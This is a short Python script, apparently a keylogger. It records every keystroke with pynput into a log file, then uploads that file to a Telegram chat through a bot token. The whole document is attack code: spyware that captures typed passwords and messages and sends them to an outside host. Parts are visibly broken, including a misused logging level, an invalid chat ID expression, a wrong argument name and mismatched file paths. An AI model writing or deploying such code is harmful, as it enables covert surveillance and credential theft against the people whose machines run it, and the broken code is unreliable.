from pynput.keyboard import *
import logging
import telepot
from datetime import date

log_dir = ""

logging.basicConfig(filename=(log_dir+'track.txt'),level=logging.debug, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
    
    

bot_token = 'BOT_TOKEN'
tel_id = ID_personal or group
today = date.today()
bot = telepot.Bot(bot_token)
bot.sendDocument(tel_id,photo=open(r'C:\\track.txt', 'rb'),caption=today)
#bot.sendMessage(tel_id,'testing meesagsse')


